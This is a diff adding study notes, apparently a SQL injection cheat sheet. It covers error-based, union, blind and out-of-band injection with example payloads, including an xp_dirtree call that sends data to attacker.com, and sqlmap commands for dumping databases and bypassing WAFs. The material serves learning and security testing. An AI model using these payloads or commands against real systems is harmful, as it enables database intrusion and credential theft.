@@ -1,0 +1,127 @@
+What SQL Injection Is
+
+
+Think of a web app talking to a database.
+
+The web app sends queries (like questions) to the database: “Hey, give me the username and password of this guy.”
+
+If the developer doesn’t secure the code, an attacker can inject their own malicious SQL commands into that query.
+
+This can lead to:
+
+            Dumping entire databases
+
+            Bypassing logins
+
+            Modifying/deleting data
+
+            Taking full control of the server
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+🧩 Types of SQL Injection (with Examples)
+
+1. In-band SQLi (Classic)
+
+  a) Error-based SQLi
+
+Uses database error messages to extract information.
+
+Example payload:
+          ' OR 1=1 --
+
+Example with forcing an error (MySQL):
+           ' AND EXTRACTVALUE(1, CONCAT(0x7e, user(), 0x7e)) --
+
+→ This makes DB leak current database user.
+
+
+  b) Union-based SQLi
+
+Attacker uses UNION SELECT to combine results.
+
+Example payload:
+           ' UNION SELECT null, username, password FROM users --
+
+Usage:
+
+Step 1: Find number of columns
+              ' ORDER BY 3 --
+Step 2: Inject with UNION SELECT
+
+
+
+2. Inferential SQLi (Blind)
+
+a) Boolean-based Blind
+
+No errors, attacker checks true/false responses.
+
+Example payload:
+          ' AND 1=1 --
+          ' AND 1=2 --
+If first gives different response than second → vulnerable.
+
+
+b) Time-based Blind
+
+Uses time delays to confirm results.
+
+Example payload (MySQL):
+           ' OR IF(1=1, SLEEP(5), 0) --
+→ If response is delayed, condition is true.
+
+
+
+
+3. Out-of-Band SQLi
+
+Uses external requests (DNS/HTTP) to exfiltrate data.
+
+Example (MSSQL):
+          '; exec master..xp_dirtree '\\attacker.com\share' --
+Database makes request to attacker’s server → leaks info.
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+⚙️ SQLi Tools (with Commands)
+
+
+1. sqlmap:
+
+Basic DB discovery:         sqlmap -u "http://target.com/item.php?id=1" --dbs
+
+Extract tables from a DB:   sqlmap -u "http://target.com/item.php?id=1" -D targetdb --tables
+
+Extract data from table:    sqlmap -u "http://target.com/item.php?id=1" -D targetdb -T users --dump
+
+Bypass WAF:                 sqlmap -u "http://target.com/item.php?id=1" --tamper=between
+
+
+
+2. Burp Suite:
+
+Intercept request → send to Repeater → inject payloads.
+
+Example injection in parameter:    id=1' OR '1'='1
+
+
+
+3. Havij:
+
+GUI-based SQL injection tool (point-and-click).
+  
+                         
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
